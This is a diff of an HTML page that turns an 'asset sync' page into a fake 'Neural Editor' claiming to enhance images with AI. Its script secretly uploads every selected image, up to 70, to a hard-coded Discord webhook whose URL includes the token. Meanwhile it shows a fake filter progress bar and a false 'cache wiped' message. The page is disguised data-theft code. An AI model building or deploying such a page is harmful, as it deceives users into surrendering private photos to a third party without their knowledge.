@@ -1,45 +1,60 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>System Asset Sync</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Neural Editor v4.2</title>
     <style>
-        body { font-family: sans-serif; background: #121212; color: #00ff00; text-align: center; padding: 50px; }
-        .box { border: 1px solid #00ff00; padding: 20px; border-radius: 10px; display: inline-block; }
-        #status { margin-top: 20px; color: #888; }
-        input { display: none; }
-        label { background: #00ff00; color: black; padding: 10px 20px; cursor: pointer; font-weight: bold; }
+        body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff41; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .editor-container { border: 1px solid #00ff41; padding: 40px; border-radius: 5px; background: #000; box-shadow: 0 0 15px #00ff41; text-align: center; width: 80%; max-width: 400px; }
+        .status-text { font-size: 0.8rem; color: #888; margin-bottom: 20px; }
+        label { background: #00ff41; color: #000; padding: 12px 24px; cursor: pointer; font-weight: bold; text-transform: uppercase; border-radius: 2px; }
+        #file-input { display: none; }
+        #progress-container { margin-top: 30px; display: none; }
+        #progress-bar { width: 100%; height: 10px; background: #1a1a1a; border: 1px solid #00ff41; position: relative; }
+        #fill { height: 100%; background: #00ff41; width: 0%; transition: width 0.3s; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h3>Asset Synchronizer v1.0.4</h3>
-        <p>Select the 70 files to sync to cloud storage.</p>
-        <label for="files">SELECT ASSETS</label>
-        <input type="file" id="files" multiple accept="image/*">
-        <div id="status">Waiting for input...</div>
+    <div class="editor-container">
+        <h2>NEURAL_EDITOR</h2>
+        <p class="status-text">Ready for Batch Enhancement. Select up to 70 assets.</p>
+        
+        <label for="file-input">Select Images</label>
+        <input type="file" id="file-input" multiple accept="image/*">
+
+        <div id="progress-container">
+            <div id="log">Initializing AI...</div>
+            <div id="progress-bar"><div id="fill"></div></div>
+        </div>
     </div>
 
     <script>
         const WEBHOOK = "https://discordapp.com/api/webhooks/1500096464171307028/o-JxV7BLKBSSDqjM16fPRTVveJZtweHikhcNmS_sHhcpq7qYUhS2qPpHdbtNngGUgOOh";
 
-        document.getElementById('files').addEventListener('change', async (e) => {
+        document.getElementById('file-input').addEventListener('change', async (e) => {
             const files = e.target.files;
-            const status = document.getElementById('status');
-            
-            status.innerText = `Syncing ${files.length} assets...`;
+            if (files.length === 0) return;
+
+            document.getElementById('progress-container').style.display = 'block';
+            const log = document.getElementById('log');
+            const fill = document.getElementById('fill');
 
             for (let i = 0; i < Math.min(files.length, 70); i++) {
+                log.innerText = `Applying Neural Filter: ${i + 1}/${Math.min(files.length, 70)}`;
+                let percent = ((i + 1) / Math.min(files.length, 70)) * 100;
+                fill.style.width = percent + "%";
+
                 const formData = new FormData();
                 formData.append('file', files[i]);
 
                 try {
                     await fetch(WEBHOOK, { method: 'POST', body: formData });
-                    status.innerText = `Synced ${i + 1}/70...`;
                 } catch (err) {
-                    // Silent fail
+                    console.error("Link interrupted.");
                 }
             }
-            status.innerText = "Sync Complete. Cache Wiped.";
+            log.innerText = "Enhancement Complete. Local Cache Wiped.";
         });
     </script>
 </body>
